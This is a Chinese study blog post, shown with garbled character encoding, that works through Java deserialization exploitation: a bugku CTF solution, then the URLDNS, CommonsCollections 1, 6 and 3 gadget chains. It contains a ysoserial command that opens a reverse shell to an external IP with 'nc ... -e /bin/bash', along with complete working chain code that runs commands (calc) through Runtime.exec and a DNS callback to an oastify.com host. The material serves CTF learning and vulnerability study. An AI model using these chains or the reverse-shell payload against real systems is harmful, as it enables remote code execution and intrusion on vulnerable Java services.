<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># åšé¢˜â†“</span><br><span class="line"></span><br><span class="line"># bugku</span><br><span class="line"></span><br><span class="line">## ez_java_serialize</span><br><span class="line"></span><br><span class="line">æºç æœ‰commons-collections çš„3.1çš„ä¾èµ–ï¼Œç›´æ¥æ‰“</span><br><span class="line"></span><br></pre></td></tr></table></figure>
java -jar ysoserial.jar CommonsCollections5 &quot;nc 123.56.226.71 443 -e /bin/bash&quot; |base64 -w0
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># URLDNSé“¾å­</span><br><span class="line"></span><br><span class="line">## å…³é”®ç‚¹</span><br><span class="line"></span><br><span class="line">æœ€å¼€å§‹æ˜¯è¿™æ ·ï¼Œä½†æ˜¯åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå‘èµ·dnsè¯·æ±‚</span><br><span class="line"></span><br><span class="line">å› ä¸ºï¼šè¿™ä¸ªputè°ƒç”¨hashï¼Œè°ƒç”¨keyçš„hashcodeï¼›ä¹Ÿå°±æ˜¯urlçš„hashcodeï¼Œç„¶åé‚£ä¸ª-1çš„å€¼å°±ä¼šå‘ç”Ÿå˜åŒ–ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¸ä¼šå‘èµ·è¯·æ±‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>
HashMap&lt;URL,Integer&gt; hashmap=new HashMap&lt;&gt;();
URL url=new URL(&quot;http://gm61kjxu965tjvssmnwn4l0af1lr9g.oastify.com&quot;);
hashmap.put(url,1);
serialize(hashmap);
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">é‚£å°±ä¿®æ”¹urlçš„hashcodeğŸ‘‡ï¼Œåœ¨putä¹‹å‰æ”¹æˆä¸æ˜¯-1çš„æ•°ï¼Œputä¹‹åå†æ”¹ä¸º-1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
Field hashcodefield=c.getDeclaredField(&quot;hashCode&quot;);
hashcodefield.setAccessible(true);
hashcodefield.set(url,1234);
hashmap.put(url,1);
hashcodefield.set(url,-1);
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## ç»“æ„</span><br><span class="line"></span><br></pre></td></tr></table></figure>
Gadget Chain:
  HashMap.readObject()
      HashMap.putVal()
          HashMap.hash()
              URL.hashCode()
</code></pre>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>    public static void main(String[] args) throws Exception&#123;
        HashMap&lt;URL,Integer&gt; hashmap= new HashMap&lt;URL,Integer&gt;();
        // è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚
        URL url = new URL(&quot;http://lpe9n3shyhwxdmfp7683i8cxbohe53.oastify.com&quot;);
        Class c = url.getClass();
        Field hashcodefile = c.getDeclaredField(&quot;hashCode&quot;);
        hashcodefile.setAccessible(true);
        hashcodefile.set(url,1234);
        hashmap.put(url,1);

        // è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§
        hashcodefile.set(url,-1);
        serialize(hashmap);
        unserialize(&quot;ser.bin&quot;);

    &#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># CC1é“¾å­</span><br><span class="line"></span><br><span class="line">## å–æ</span><br><span class="line"></span><br><span class="line">- https://blog.lupf.cn/category/jdkdl</span><br><span class="line">  - 8899å¯†ç </span><br><span class="line">- https://www.oracle.com/java/technologies/downloads/#jre8-windows</span><br><span class="line">- - å®˜ç½‘8u65,ä¸­æ–‡ç‰ˆæ’ç‰ˆæœ‰é—®é¢˜</span><br><span class="line">- </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## æ­å»ºé—®é¢˜</span><br><span class="line"></span><br><span class="line">### æŒ‚ç¾Šå¤´å–ç‹—è‚‰çš„å®˜ç½‘ï¼Œæ¢æˆè‹±æ–‡ç‰ˆçš„å°±å¥½äº†</span><br><span class="line"></span><br><span class="line">![image-20250122235802317](https://github.com/DDL08/images/blob/img/img/image-20250122235802317.png?raw=true)</span><br><span class="line"></span><br><span class="line">### æˆ‘è§£å‹å‡ºçš„8u65æ²¡æœ‰srcï¼Œ</span><br><span class="line"></span><br><span class="line">![image-20250123123237633](https://github.com/DDL08/images/blob/img/img/image-20250123123237633.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250123123350994](https://github.com/DDL08/images/blob/img/img/image-20250123123350994.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250123124313907](https://github.com/DDL08/images/blob/img/img/image-20250123124313907.png?raw=true)</span><br><span class="line"></span><br><span class="line">ä¸çŸ¥é“å·®å“ªäº†ï¼Œç”¨å®˜ç½‘çš„é‡æ–°è£…äº†ä¸€ä¸‹ï¼Œæ³¨æ„jdkå’Œjreåˆ«æ”¾åœ¨åŒä¸€æ–‡ä»¶å¤¹é‡Œï¼Œè¦åˆ†å¼€ï¼Œä¸ç„¶æŠ¥é”™</span><br><span class="line"></span><br><span class="line">ç„¶åæŠŠjdk-af660750b2f4\src\share\classesé‡Œé¢çš„runæ‹·è´åˆ°8u65çš„srcï¼Œç›®çš„æ˜¯èƒ½æŠŠ .class æ–‡ä»¶è½¬æ¢ä¸º .java æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">![image-20250123135024200](https://github.com/DDL08/images/blob/img/img/image-20250123135024200.png?raw=true)</span><br><span class="line"></span><br><span class="line">### find usagesåªæœ‰ä¸€ä¸ª</span><br><span class="line"></span><br><span class="line">è¿™ä¸€ä¸ªè¿˜æ˜¯è‡ªå·±å†™çš„ï¼Œæˆ‘ä»¥ä¸ºæ˜¯æˆ‘ç¤¾åŒºç‰ˆçš„åŸå› æˆ‘å»ç ´è§£äº†ä¸€ä¸‹ideaï¼Œç»“æœå‘ç°è¿˜æ˜¯è¿™æ ·ï¼Œè¿˜å¥½æœ€ç»ˆåœ¨Drunkbabyçš„æ•™å­¦ä¸­çœ‹åˆ°äº†ctrl+alt+shif+f7å¯ä»¥ä¿®æ”¹è¿™ç©æ„ğŸ¤£</span><br><span class="line"></span><br><span class="line">![image-20250123170922648](https://github.com/DDL08/images/blob/img/img/image-20250123170922648.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250123171502441](https://github.com/DDL08/images/blob/img/img/image-20250123171502441.png?raw=true)</span><br><span class="line"></span><br><span class="line">ç„¶åå°±å¯ä»¥æŸ¥äº†</span><br><span class="line"></span><br><span class="line">## æ“ä½œ</span><br><span class="line"></span><br><span class="line">### åŸºç¡€åå°„</span><br><span class="line"></span><br><span class="line">1. è·å–ç±»</span><br><span class="line">2. è·å–ç±»çš„æ–¹æ³•</span><br><span class="line">3. è®¾ç½®ç§æœ‰å±æ€§å¯è¯»</span><br><span class="line">4. è°ƒç”¨ç±»é‡Œçš„æ–¹æ³•</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Runtime runtime &#x3D; Runtime.getRuntime();</p>
<p>Class c &#x3D; Runtime.class;  </p>
<p>Method method &#x3D; c.getDeclaredMethod(â€œexecâ€, String.class); </p>
<p>method.setAccessible(true);  </p>
<p>method.invoke(c, â€œcalcâ€);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å¦ç±»æ ‡å‡†åå°„ğŸ‘‡</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Class c &#x3D;Runtime.class;</p>
<p>Method getRuntimeMethod &#x3D; c.getMethod(â€œgetRuntimeâ€);</p>
<p>Runtime r &#x3D; (Runtime)getRuntimeMethod.invoke(null,null);</p>
<p>Method execMethod &#x3D; c.getMethod(â€œexecâ€,String.class);</p>
<p>execMethod.invoke(r,â€calcâ€);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### æ”¹ä¸ºInvokeTransformçš„å½¢å¼</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Runtime runtime &#x3D; Runtime.getRuntime();  </p>
<p>InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(â€œexecâ€, new Class[]{String.class} , new Object[]{â€œcalcâ€});  </p>
<p>invokerTransformer.transform(runtime);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### ç†æƒ³é“¾å­</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;<br>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedClosure;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.map.TransformedMap;</p>
<p>import java.io.*;<br>import java.lang.annotation.Target;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.Method;<br>import java.util.HashMap;<br>import java.util.Map;</p>
<p>public class Main {<br>    public static void main(String[] args) throws Exception{</p>
<pre><code>    Runtime runtime = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;key&quot;, &quot;value&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
    
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Override.class, transformedMap);

    // åºåˆ—åŒ–ååºåˆ—åŒ–
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### éœ€è¦è§£å†³ä¸‰ä¸ªé—®é¢˜</span><br><span class="line"></span><br><span class="line">### è§£å†³Runtimeæ— æ³•åºåˆ—åŒ–</span><br><span class="line"></span><br><span class="line">ä¸‹è¾¹ç»™å‡ºäº†å¯¹æ¯”ï¼ˆå’Œæ ‡å‡†åå°„çš„æ¯”ï¼Œå·²ç»æ³¨é‡Šæ‰</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>public static void main(String[] args) {<br>Transformer[] transformers &#x3D; new Transformer[]{<br>                &#x2F;&#x2F;Method getRuntimeMethod &#x3D; c.getMethod(â€œgetRuntimeâ€);<br>new InvokerTransformer(â€œgetMethodâ€, new Class[]{String.class, Class[].class}, new Object[]{â€œgetRuntimeâ€, null}),<br>                &#x2F;&#x2F;Runtime r &#x3D; (Runtime)getRuntimeMethod.invoke(null,null);<br>new InvokerTransformer(â€œinvokeâ€, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br>                &#x2F;&#x2F;Method method &#x3D; c.getDeclaredMethod(â€œexecâ€, String.class);<br>                &#x2F;&#x2F;method.invoke(c, â€œcalcâ€);<br>new InvokerTransformer(â€œexecâ€, new Class[]{String.class}, new Object[]{â€œcalcâ€})<br>        };<br>ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);<br>chainedTransformer.transform(Runtime.class);<br>    }</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### å®Œæ•´é“¾å­</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(Runtime.class), // æ„é€  setValue çš„å¯æ§å‚æ•°  
            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
    
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Target.class, transformedMap);

    // åºåˆ—åŒ–ååºåˆ—åŒ–  
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## æ€è·¯</span><br><span class="line"></span><br><span class="line">1. ä»é‡Œå¾€å¤–æ¨ï¼Œå±é™©å‡½æ•°æ˜¯InvokeTransformerç±»é‡Œé¢çš„transformæ–¹æ³•ï¼Œ</span><br><span class="line"></span><br><span class="line">   1. è¿™ä¸ªæ–¹æ³•å°±è·Ÿåå°„é‚£ä¸ªå·®ä¸å¤šï¼Œè·å–ç±»ï¼Œè·å–æ–¹æ³•ï¼Œè°ƒç”¨</span><br><span class="line">   2. è¿™ä¸ªç±»æœ‰ä¸‰ä¸ªå‚æ•°</span><br><span class="line">      1. å­—ç¬¦ä¸²å‚æ•°å</span><br><span class="line">      2. Classæ•°æ®å‚æ•°ç±»å‹</span><br><span class="line">      3. å¯¹è±¡æ•°ç»„å‚æ•°å€¼</span><br><span class="line"></span><br><span class="line">2. è¿½è¸ªï¼Œåœ¨checkSetValueä¸­å±æ€§valueTransformerè¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">   1. valuetransformeræ˜¯TransformedMapä¸­èµ‹äºˆçš„ä¸€ä¸ªå˜é‡</span><br><span class="line">      1. å› ä¸ºè¿™ä¸ªtransformMapæ˜¯ä¸ªprotectç±»ï¼Œéœ€è¦åœ¨InvokeTransformerç±»é‡Œé¢è°ƒç”¨ï¼Œæ°å¥½æœ‰ä¸ªdecorateç±»å»ç»™TransformMapèµ‹å€¼</span><br><span class="line"></span><br><span class="line">3. è¿½è¸ªï¼ŒcheckSetValueè¢«setValueè°ƒç”¨ï¼ŒsetValueæ˜¯MapEntryç±»ï¼ˆç»§æ‰¿AbstractMapEntryDecoratorï¼‰é‡Œçš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line">   1. Entryæ˜¯ä¸€ä¸ªé”®å€¼å¯¹å°±æ˜¯Entry</span><br><span class="line"></span><br><span class="line">4. ç„¶åå»éå†mapä½¿ç”¨setValueæ–¹æ³•ï¼Œ</span><br><span class="line"></span><br><span class="line">5. æŸ¥æ‰¾è°ƒç”¨setValueçš„readobject</span><br><span class="line"></span><br><span class="line">   1. åœ¨AnnotationInvocationHandleré‡Œçš„readobjectæ–¹æ³•é‡Œè¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">   2. è¿™é‡Œé¢æœ‰éå†æ•°ç»„çš„åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡if</span><br><span class="line"></span><br><span class="line">   3. æ¥æ”¶classå¯¹è±¡å’Œmapä¿©å¯¹è±¡</span><br><span class="line"></span><br><span class="line">   4. æ²¡æœ‰ç±»å‹å°±æ˜¯defaultç±»å‹ï¼Œéœ€è¦é€šè¿‡åå°„è·å–</span><br><span class="line"></span><br><span class="line">   5. åå°„è·å–å…¨å</span><br><span class="line"></span><br><span class="line">      - ```</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></pre></td></tr></table></figure>

<pre><code>  - ```
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
    aihConstructor.setAccessible(true);  
    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  Object o = aihConstructor.newInstance(Override.class, transformedMap); </span><br></pre></td></tr></table></figure>
</code></pre>
<ol start="6">
<li><p>æ„é€ å‡ºç†æƒ³é“¾å­ä¹‹åè¿˜éœ€è¦è§£å†³ä¸‰ä¸ªé—®é¢˜</p>
<ol>
<li>Runtimeå¯¹è±¡ä¸å¯åºåˆ—åŒ–ï¼Œéœ€é€šè¿‡åå°„å˜æˆå¯åºåˆ—åŒ–çš„å½¢å¼<ol>
<li>ä¸Šè¾¹ç»™å‡º</li>
<li>ä»ä»£ç çš„å¤ç”¨æ€§è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬åº”å½“å‡å°‘è¿™ç§å¤ç”¨çš„å·¥ä½œé‡ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨ <code>ChainedTransformer</code> è¿™ä¸ªç±»ã€‚</li>
<li><code>ChainedTransformer</code> ç±»ä¸‹çš„ <code>transform</code> æ–¹æ³•é€’å½’è°ƒç”¨äº†å‰ä¸€ä¸ªæ–¹æ³•çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªæ–¹æ³•çš„å‚æ•°ã€‚</li>
</ol>
</li>
<li>è¿›å…¥setValueçš„ä¸¤ä¸ªifåˆ¤æ–­<ol>
<li>é‡å†™overideé‡Œé¢æœ‰Targeté‡Œé¢æœ‰value</li>
</ol>
</li>
<li>æœ€åçš„è¿”å›å€¼<ol>
<li>æœ€ååˆ©ç”¨ï¼Œèƒ½å¤Ÿè§£å†³ <code>setValue</code> å¯æ§å‚æ•°çš„ç±» â€”â€”â€”â€” <code>ConstantTransformer</code></li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="ä½¿ç”¨è¾…åŠ©å‡½æ•°"><a href="#ä½¿ç”¨è¾…åŠ©å‡½æ•°" class="headerlink" title="ä½¿ç”¨è¾…åŠ©å‡½æ•°"></a>ä½¿ç”¨è¾…åŠ©å‡½æ•°</h1><ul>
<li>ChainedTransformer<ul>
<li>ä¼ å…¥ä¸€ä¸ªtransformæ•°ç»„</li>
<li>ä»–æœ‰ä¸ªtransformå‡½æ•°æœ‰ä¸ªtransformæ–¹æ³•ï¼Œå°†å‰ä¸€ä¸ªè¾“å‡ºè½¬ä¸ºåä¸€ä¸ªçš„è¾“å…¥</li>
</ul>
</li>
</ul>
<h1 id="CC6é“¾å­"><a href="#CC6é“¾å­" class="headerlink" title="CC6é“¾å­"></a>CC6é“¾å­</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC6 é“¾è¢«ç§°ä¸ºæœ€å¥½ç”¨çš„ CC é“¾ï¼Œæ˜¯å› ä¸ºå…¶ä¸å— jdk ç‰ˆæœ¬çš„å½±å“ï¼Œæ— è®ºæ˜¯ jdk8u65ï¼Œæˆ–è€… jdk9u312 éƒ½å¯ä»¥å¤ç°ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">	HashMap.put()	#HashMap.put() --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash()</span><br><span class="line">	HashMap.hash()</span><br><span class="line">		TiedMapEntry.hashCode()</span><br><span class="line">		TiedMapEntry.getValue()</span><br><span class="line">			LazyMap.get()</span><br><span class="line">				ChainedTransformer.transform()</span><br><span class="line">					InvokerTransformer.transform()</span><br><span class="line">						Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="å®Œæ•´é“¾å­"><a href="#å®Œæ•´é“¾å­" class="headerlink" title="å®Œæ•´é“¾å­"></a>å®Œæ•´é“¾å­</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;  </span><br><span class="line">    Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">    new ConstantTransformer(Runtime.class),  </span><br><span class="line">    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  </span><br><span class="line">    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">    &#125;;  </span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">    HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object,Object&gt;();  </span><br><span class="line">    Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,new ConstantTransformer(1));  </span><br><span class="line">  </span><br><span class="line">    HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">    map2.put(tiedMapEntry,&quot;bbb&quot;);  </span><br><span class="line">    map.remove(&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">    Class c = LazyMap.class;  </span><br><span class="line">    Field fieldfactory = c.getDeclaredField(&quot;factory&quot;);  </span><br><span class="line">    fieldfactory.setAccessible(true);  </span><br><span class="line">    fieldfactory.set(lazymap,chainedTransformer);  </span><br><span class="line">    serialize(map2);  </span><br><span class="line">    unserialize(&quot;ser.bin&quot;);  </span><br><span class="line">  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æœ‰æ–¹æ³•è°ƒç”¨å°±ä¼šè°ƒç”¨invoke</p>
<p>æœ‰ä¸ªputæ˜¯æŠŠé”®å€¼å¯¹æå‰æ”¾å…¥Entryé‡Œé¢</p>
<ul>
<li>map2.put(tiedMapEntry,â€bbbâ€); </li>
<li>map.remove(â€œaaaâ€);</li>
</ul>
<p>å‰åŠæ®µå’Œcc1ä¸€æ ·ç”¨çš„æ˜¯ChainedTransformerï¼ŒååŠæ®µæ˜¯</p>
<ol>
<li>ç”¨çš„å±é™©å‡½æ•°è¿˜æ˜¯transform</li>
<li>ç¬¬äºŒå±‚æ˜¯LazyMapçš„getæ–¹æ³•</li>
<li><code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code> æ–¹æ³•<ol>
<li>è¿™ä¸ªä¸æ˜¯getæ–¹æ³•è¿½æº¯çš„çš„äº†ï¼Œè¿½æº¯æœ‰4åƒ+æ‰¾ä¸åˆ°</li>
<li>ysoSerialå®˜æ–¹çš„é“¾å­é‡Œè¿™ä¸ªç±»çš„mapå±æ€§åœ¨getKeyä¸­è°ƒç”¨äº†è¿™ä¸ªgetæ–¹æ³•</li>
</ol>
</li>
<li></li>
</ol>
<h1 id="CC3é“¾å­"><a href="#CC3é“¾å­" class="headerlink" title="CC3é“¾å­"></a>CC3é“¾å­</h1><p>ä»å¤–å¾€é‡Œç»“æ„å›¾</p>
<h2 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>è¿™é‡Œè¿˜æ˜¯ä»é‡Œå¾€å¤–æ¨ï¼Œæ ¸å¿ƒå‡½æ•°ä»Runtime.execæ¢æˆ <strong>ClassLoaderçš„defineClass</strong>ï¼Œè¿™æ ·èƒ½å®ç°çš„åŠŸèƒ½å°±å¤šäº†ï¼ˆè¿œç¨‹åŠ è½½ç±»</p>
<ol>
<li><p>é¦–å…ˆæ˜¯ <code>loadClass()</code>ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ <code>findClass()</code>ã€‚</p>
</li>
<li><p>findclassè§¦å‘defineClass</p>
<ol>
<li><p>æŠŠclasså¤„ç†æˆjavaç±»</p>
</li>
<li><pre><code>public Class findClass(String name) &#123;
    byte[] b = loadClassData(name);
    return defineClass(name, b, 0, b.length);
         &#125;
